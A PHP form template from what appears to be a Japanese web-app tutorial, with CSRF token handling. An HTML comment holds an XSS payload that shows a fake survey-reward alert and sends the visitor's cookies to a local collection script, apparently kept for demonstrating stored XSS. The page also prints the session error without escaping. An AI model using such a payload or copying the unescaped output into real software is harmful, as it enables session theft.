<?php
// リクワイヤーワンス
require_once('functions.php');
setToken(); // 追記
?>

<!DOCTYPE html>
<html lang="ja">

<head>
  <meta charset="UTF-8">
  <title>新規作成</title>
</head>

<body>
  <?php if (!empty($_SESSION['err'])): ?> 
    <p><?= $_SESSION['err']; ?></p> 
  <?php endif; ?>

  <form action="store.php" method="post">
    <input type="hidden" name="token" value="<?= $_SESSION['token']; ?>"> 

    <input
      type="hidden"
      name="action"
      value="create"
    >

    <input
      type="text"
      name="content"
    >

    <input
      type="submit"
      value="作成"
    >

    <!-- <script>if (!alert('今ならアンケート回答で1万円GET！アンケートに答えますか？')) {location.href = 'http://localhost:9999/xss.php?' + document.cookie;}</script>   -->

  </form>

  <div>
    <a href="index.php">
      一覧へもどる
    </a>
  </div>
  <?php unsetError(); ?>

</body>

</html>